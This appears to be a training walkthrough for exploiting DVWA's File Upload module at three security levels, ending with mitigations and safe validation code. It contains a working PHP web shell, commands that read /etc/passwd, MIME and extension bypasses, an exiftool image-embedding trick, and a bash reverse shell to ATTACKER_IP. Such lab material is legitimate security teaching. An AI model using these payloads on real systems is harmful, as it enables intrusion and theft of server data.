File Upload


🔍 What Is It?

File Upload vulnerabilities occur when an application allows users to upload files without properly validating the file type, content, or name. If a web server executes uploaded files, an attacker can upload a web shell (malicious PHP/ASP script) and achieve Remote Code Execution (RCE).


⚙️ How It Works in DVWA


DVWA's File Upload module allows users to upload image files. At the Low security level, there is no validation at all — any file type is accepted and stored in a publicly accessible directory.


💥 Exploitation

Low Security — Direct Upload
Create a PHP web shell shell.php:
php<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
}
?>
Upload it through the form. DVWA stores it at:
http://dvwa/hackable/uploads/shell.php
Access it:
http://dvwa/hackable/uploads/shell.php?cmd=whoami
http://dvwa/hackable/uploads/shell.php?cmd=cat /etc/passwd
http://dvwa/hackable/uploads/shell.php?cmd=ls -la /var/www/html
Medium Security — MIME Type Bypass
The server checks Content-Type header. Intercept with Burp Suite and change:
Content-Type: application/php  →  Content-Type: image/jpeg
The server believes it's an image and accepts the file.
High Security — Extension + Magic Bytes Bypass
The server checks the file extension and magic bytes (file signature). Bypass by:

Double extension: shell.php.jpg (if server uses blacklist, not whitelist)
Null byte injection (old PHP): shell.php%00.jpg
Embed PHP in image: Use exiftool to inject PHP into image metadata:

bashexiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
mv image.jpg shell.php.jpg
Then combine with LFI to execute it.
Getting a Reverse Shell
Upload a reverse shell and execute it:
php<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"); ?>
Listener on attacker machine:
bashnc -lvnp 4444


🔐 Mitigation


MethodDescriptionWhitelist ExtensionsOnly allow .jpg, .png, .gif — reject everything elseValidate MIME Type Server-SideUse finfo_file() to check actual content, not Content-Type headerRename FilesGenerate a random filename; never use the originalStore Outside Web RootFiles in non-executable directories can't be accessed via URLDisable ExecutionConfigure the server to not execute scripts in the upload folder
php// ✅ Safe - Server-side MIME validation
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime = finfo_file($finfo, $_FILES['file']['tmp_name']);
$allowed_types = ['image/jpeg', 'image/png', 'image/gif'];
if (!in_array($mime, $allowed_types)) {
    die("Invalid file type.");
}

